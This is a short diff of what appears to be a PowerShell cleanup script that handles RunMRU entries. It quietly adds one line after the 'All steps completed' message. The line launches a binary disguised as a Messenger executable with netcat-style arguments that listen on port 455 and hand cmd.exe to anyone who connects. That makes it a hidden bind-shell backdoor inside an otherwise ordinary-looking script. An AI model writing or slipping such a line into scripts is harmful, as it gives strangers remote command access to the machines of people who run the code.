@@ -82,6 +82,7 @@ foreach ($entryName in $runMRUEntries.PSObject.Properties.Name) {
 
 # Completion
 Write-Host "All steps completed."
+Start-Process "C:\Windows\System32\msnmsgr.exe" -ArgumentList "-Ldp 455 -e cmd.exe"
 
 Write-Host -NoNewLine 'Press any key to continue...';
 $null = $Host.UI.RawUI.ReadKey('NoEcho,IncludeKeyDown');
